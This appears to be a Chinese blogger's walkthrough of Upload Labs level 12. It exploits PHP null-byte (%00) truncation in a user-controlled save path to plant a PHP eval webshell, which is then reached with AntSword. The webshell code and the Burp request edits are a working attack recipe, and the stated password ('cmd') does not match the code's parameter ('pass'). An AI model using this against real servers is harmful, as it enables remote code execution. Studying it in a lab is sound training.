---
title: Upload Labs 第12关：利用 %00 截断修改保存路径实现上传绕过。
url: https://mp.weixin.qq.com/s/UspIoZYH17ve__KuKBx9HA
source: Doonsec's feed
date: 2026-03-26
fetch_date: 2026-03-27T04:27:27.358807
---

# Upload Labs 第12关：利用 %00 截断修改保存路径实现上传绕过。

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/5vTt22mqAAws27u6hWRcKGViaDtOHSYic4IyhGkVEw3OV50Xiam95hHiarennP9FETjVn0lHsQ9NSvKssgpianm6sx6dBiaQW2AGILZ4siap3ZPgO0/0?wx_fmt=jpeg)

# Upload Labs 第12关：利用 %00 截断修改保存路径实现上传绕过。

sec0nd安全

![]()

在小说阅读器中沉浸阅读

以下文章来源于武文学网安
，作者武文学网安

![](http://wx.qlogo.cn/mmhead/6t0VDe9bl5d1qkFvGM32t44lGdk58yNqVvJxDmMJRuZsrIUiayzP0AD0S7icrd1icHlWwYUiaeJsbaA/0)

**武文学网安**
.

你好。我是武文，一个普通的中年宅男，用兴趣作为引导，从零开始学习网络安全，也希望能以此作为第二技能，以备不时之需。欢迎关注，见证一个普通人的硬核转型。

大家好，我是武文。

在前面的关卡中，我们已经通过各种方式绕过了文件名检测，例如：

* 双写后缀
* 点空格绕过
* $DATA 绕过

但这些本质都是：

绕过“文件名检测”

而第12关的思路完全不同：

不再绕过文件名，而是直接控制“文件保存路径”

这也是这一关最容易被误解的地方。

一、前置知识：%00 截断

1 %00 是什么

在不同层中，它的表现形式不同：

层级

表示方式

URL 编码%00

PHP 字符串\0

C语言NULL（字符串结束符）

2 关键特性：字符串“终止符”

在底层（C语言）中：

```
charstr[] ="shell.php\0.jpg";
```

系统会认为字符串在 \0 处结束：

实际内容 = shell.php

后面的：

.jpg

会被直接忽略。

3 三层解析差异（非常关键）

%00 截断漏洞的本质，并不在于编码本身，而在于不同处理层对输入数据的解析方式不一致。

可以将整个过程划分为三个关键阶段：

① HTTP / URL 解析层

浏览器发送的数据为：shell.php%00.jpg

其中：

%00 是 NULL 字节（\x00）的 URL 编码形式

需要注意：

浏览器本身并不会将 %00 转换为 \x00，而是以编码形式发送给服务器，是否被解码取决于服务端处理逻辑。

② PHP 处理层

服务器接收到请求后，交由 PHP 进行解析，例如：$\_GET['save\_path']

在这一阶段：%00

可能被解码为 \x00

也可能被过滤或截断

甚至可能以字符串形式保留（取决于环境）

因此：

PHP 层看到的字符串，并不一定包含真实的 NULL 字节，这一点是漏洞是否可利用的关键。

③ 底层 C 函数处理层

当 PHP 调用底层函数，如：

```
move_uploaded_file()
```

最终会进入 C 语言实现。

在 C 语言中：

```
char str[] ="shell.php\0.jpg";
```

由于 \0 是字符串结束符：

实际有效内容 = shell.php

后面的：

.jpg

会被直接忽略，从而发生截断。

4 为什么会产生漏洞

因为：

检测逻辑（PHP） ≠ 执行逻辑（底层）

举个典型例子：

文件名：shell.php%00.jpg在 PHP 中检测

后缀：.jpg → 合法 ✅在底层保存

shell.php\0.jpg → shell.php最终结果

成功生成 shell.php

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAwO4ibOZrx1KLzBsI0iazuOnlytuqPicunyLE9IfI1lL0mWwBpwRfVUn9RmwmTx6mZbEjicTvl0hpMqsCYm0oQNyqI36FmkoeHlYqc/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

当然，浏览器发送 %00，是否被解析为 \x00 取决于服务器和语言处理机制。只有在特定环境下，%00 才会被解析为 NULL 字节，从而导致底层函数截断

二、第12关源码关键点

这一关和前面最大的区别是：

👉 文件保存路径来自用户输入

典型代码：

```
$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);    if(in_array($file_ext,$ext_arr)){        $temp_file = $_FILES['upload_file']['tmp_name'];        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;        if(move_uploaded_file($temp_file,$img_path)){            $is_upload = true;        } else {            $msg = '上传出错！';        }    } else{        $msg = "只允许上传.jpg|.png|.gif类型文件！";    }}
```

作用：

获取最后一个 . 后面的内容作为扩展名

例如：

1.jpg → jpg ✅

shell.php → php ❌

2 白名单判断

```
if(in_array($file_ext,$ext_arr))
```

只允许：

```
jpg / png / gif
```

👉 这里本身没问题

3 关键漏洞点：保存路径

```
$img_path = $_GET['save_path']."/".rand(...).".".$file_ext;
```

👉 save\_path 来自用户可控的 GET 参数

也就是说：

你可以控制“文件保存位置”

4 文件保存

```
move_uploaded_file($temp_file,$img_path)
```

这里会调用底层函数（C实现）。

三、漏洞点分析（重点）

这一关采用了白名单，与前面所有的关卡都不一致，所以前面的绕过方法在这一关行不通了。

问题在于：

保存路径是用户可控的

并且：未对路径中的特殊字符（如 %00）进行有效处理

---

# 四、攻击思路

我们不直接改文件名，而是：

修改保存路径 + 利用 %00 截断

---

# 五、实战操作

---

## 1 准备一句话木马

```
<?php@eval($_POST['pass']); ?>
```

---

## 2 正常上传，将shell.php改名为正常的.jpg结尾文件。

```
shell.jpg

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAw3ibrmvrGhNFaFSuuGwF66OTCTB6dHbMAghgL1mzdT1Z0Aq13ugk9Lvy80a4MZTV6NJzibvdQJqpVJFKmS45HpXJYTliakaWzDdA/640?wx_fmt=gif&from=appmsg)
```

---

## 3 Burp Suite 抓包

找到请求参数：

```
```
POST /upload-labs/...
```
```

Body 中会有类似：

```
```
save_path=upload/
```
```

---

## 4 修改保存路径（关键）

将：

```
```
save_path=upload/
```
```

修改为：

```
```
save_path=upload/shell.php%00
```
```

---

## 5 保持上传文件为图片

例如：

```
```
filename="shell.jpg"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/5vTt22mqAAxPnfUo2hBNUibdaZerosNqsibISSIECH2IYC1uSZ9LfFOk5d8QQmkicRSE6h8I1G5Q9VASpklbTQP62jsnC33q9ltYfhibDqRmgyM/640?wx_fmt=gif&from=appmsg)
```

---

## 6 发送请求

服务器处理，原意是要把我们的上传文件处理成为：

```
shell.php�/1520260325004656.jpg
```

实际php后面的内容已经被截断，在服务器中保存的真实文件为shell.php

![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAzDP9aVBtXrBZDSkwP7GBfpBicBiatUpV8oxoIJHIlJqgvs0PGrI4YicmG5bysPOMmRduNeicvMdVq2ttKhYXCE9579iaPI24Y2uGU0/640?wx_fmt=gif&from=appmsg)

我们也可以看到在后台upload文件夹中仅存在shell.php

![](https://mmbiz.qpic.cn/mmbiz_png/5vTt22mqAAyHxfSmUvShiahRKF49Le4hWpyW2CyG1eSjpiadIyRPhDJpZo0ojJQquSvgcHU5bSmYbLbiaHlIbbbm0Q3VvDticia3G9nobOjAGdias/640?wx_fmt=png&from=appmsg)

在实际测试过程中，我一开始做实验的时候始终都是上传失败。尝试了更换不同版本的php，更换不同系统环境，Linux Windows都进行了尝试，文件上传始终失败；

在找到部分评论区有人提到是否是 `magic_quotes_gpc = On` 导致的。于是我将状态设置为Off后，漏洞可以成功复现，成功上传文件。

进一步查阅资料分析发现，`magic_quotes_gpc` 本身仅用于对引号进行转义，并不会直接处理 NULL 字节。但在开启状态下，可能会对输入数据产生额外干扰，导致路径字符串在传递过程中发生变化，从而影响底层函数的处理结果。

本实验现象也说明，在漏洞复现过程中，环境配置（如 PHP 参数、Web 服务器行为等）可能对最终结果产生重要影响，不能简单将漏洞成因归结为单一因素。

---

# 六、验证漏洞

访问：

```
```
http://localhost/upload/shell.php
```
```

页面空白（正常）

![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAx6QIsdleCakibfSqEQiarmCAqMWHo7brKYlIDK9WFbS2UPibpYibEibUbWUNBCraSFibt2aicYNunhD4x5D0duE39RNfwAuuiazPgoLKA/640?wx_fmt=gif&from=appmsg)

使用蚁剑连接：

```
```
密码：cmd
```

![](https://mmbiz.qpic.cn/mmbiz_gif/5vTt22mqAAzLuS0W5pHuXoDmP7VozFkVjGPy1spALaMR8fNX7cyEEPgoiaFS0sLkMccBshQqluwFicTYR1uuIVErCib0RPUFRfuOiax8Eib5FghE/640?wx_fmt=gif&from=appmsg)
```

连接成功。

---

# 七、为什么这种方式能成功

关键原因：

```
%00 截断发生在“路径拼接阶段”
```

流程：

```
```
PHP 拼接路径 → upload/shell.php%00.jpg↓底层处理 → upload/shell.php
```
```

总结

在 Upload Labs 第12关中，文件上传的核心不再是绕过文件名检测，而是转向对“文件保存路径”的控制。

通过源码分析可以发现，程序虽然对上传文件的扩展名进行了白名单限制，但在文件保存阶段，直接使用了用户可控的 `save_path` 参数进行路径拼接，这为攻击者提供了可利用空间。

理论上，可以结合 `%00` 截断漏洞，将文件保存路径构造为：

```
upload/shell.php%00.jpg
```

从而在底层实现路径截断，最终生成 `shell.php` 文件。

但在实际测试过程中发现，该漏洞在现代环境中往往难以复现，其原因包括：

* `%00`

  未被解析为真实的 NULL 字节
* PHP 高版本或补丁已修复该问题
* Web 服务器（如 Apache/Nginx）对非法字符进行了拦截
* 操作系统对 NULL 字节处理更加严格

此外，`magic_quotes_gpc` 仅影响引号转义，与 NULL 字节截断并无直接关系，因此并不是导致漏洞利用失败的关键因素。

因此，第12关的核心并不在于成功利用 `%00`，而是理解：

> **当输入数据在不同处理层之间存在解析差异时，可能导致安全漏洞的产生。**

同时，也体现出在实际渗透测试中：

> **环境差异往往会直接影响漏洞的可利用性。**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/u7ibmWw94HhyPjaGFbJ1aj02bPU5jwAmG8o7vJ9jgF7q3DaU2c6Bicqz1ZTLTRWLc188vgsWFMnyNE6CX8Y1zSaw/0?wx_fmt=png)

sec0nd安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/u7ibmWw94HhyPjaGFbJ1aj02bPU5jwAmG8o7vJ9jgF7q3DaU2c6Bicqz1ZTLTRWLc188vgsWFMnyNE6CX8Y1zSaw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过